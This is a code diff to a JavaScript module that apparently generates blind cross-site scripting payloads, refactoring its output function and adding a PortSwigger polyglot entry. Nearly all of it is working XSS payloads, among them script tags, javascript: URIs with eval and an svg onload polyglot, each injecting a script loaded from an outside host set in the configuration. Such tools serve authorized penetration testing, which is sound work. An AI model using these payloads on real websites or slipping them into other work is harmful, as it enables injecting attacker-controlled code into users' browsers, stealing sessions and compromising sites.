@@ -1,17 +1,9 @@
-// Copyright 2018 Lewis Ardern. All rights reserved.
-
-function buildPayloadStructure(payloads) {
-  let structuredPayloads = '';
-  payloads.map(payload => {
-    structuredPayloads += `Description: ${payload.description}\r\n${payload.payload}\r\n\r\n`;
-    return structuredPayloads;
-  });
-  return structuredPayloads;
-}
-
 exports.generatePayloads = config => {
   const payloads = [
-    { description: 'External JavaScript', payload: `"><script src="//${config.url}/m"></script>` },
+    {
+      description: 'External JavaScript',
+      payload: `"><script src="//${config.url}/m"></script>`
+    },
     {
       description: 'JavaScript URI',
       payload: `javascript:eval("var _ = document.createElement('script');_.src='//${
@@ -23,6 +15,12 @@ exports.generatePayloads = config => {
       payload: `"><a href="javascript:eval('var _ = document.createElement(\\'script\\');_.src=\\'//${
         config.url
       }/m\\';document.getElementsByTagName(\\'body\\')[0].appendChild(_)')">Click</a>`
+    },
+    {
+      description: 'PortSwigger - BurpSuite Polygot Payload',
+      payload: `</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/${
+        config.url
+      }.slice(2),document.documentElement.appendChild(s))//'>`
     },
     {
       description: 'PortSwigger - BurpSuite Polygot Payload',
@@ -124,7 +122,7 @@ exports.generatePayloads = config => {
       }/m\\';document.getElementsByTagName(\\'body\\')[0].appendChild(_)')">`
     }
   ];
-  const structured = buildPayloadStructure(payloads);
-
-  return structured;
+  return payloads
+    .map(payload => `Description: ${payload.description}\r\n${payload.payload}\r\n\r\n`)
+    .join('');
 };
